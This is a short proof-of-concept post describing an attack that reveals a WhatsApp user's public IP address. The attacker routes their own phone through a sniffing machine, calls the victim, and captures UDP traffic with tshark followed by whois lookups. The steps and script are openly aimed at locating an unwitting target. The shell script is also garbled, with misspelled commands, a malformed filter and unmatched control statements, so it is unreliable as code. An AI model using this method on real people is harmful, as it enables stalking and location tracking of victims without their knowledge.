start wifi hotspot on attacker machine and connect attacker phone to attacker SSID 
RUN the following commands -- echo1> /proc/sys/net/ipv4/ip-forward 
IP Tables -t nat -I POSTROUTING -J MASQUERADE 
Start The poc script (below) on the attacker machine which is networking as a router (wlan0) for attacker phone 
Call Any WhatsApp User Randomly To Capture the server ip address to filter 
Call Victim On His/Her WhatsApp No.
Disconnect the call Onece Connectin Stablished .
Script will Reveal The Public IP of The Terget .
Validate the public IP On Taget Phone 
1000m.m.s
Exploit 
#! /bin/sh
Filter=tshark -i etho -T fields -f "UDP" -e ip.dst -Y "sniffer" -Y  ip.dst!=192.168.0.0 / 16 and ip.dst!=10 do

WHO IS SHINE > /tmp/b
filter='cat /tmp/b | xargs | egrep -iw "orgName:|NetName:|Country:"
echo Shine ----Stargetinfo 
Fi
done
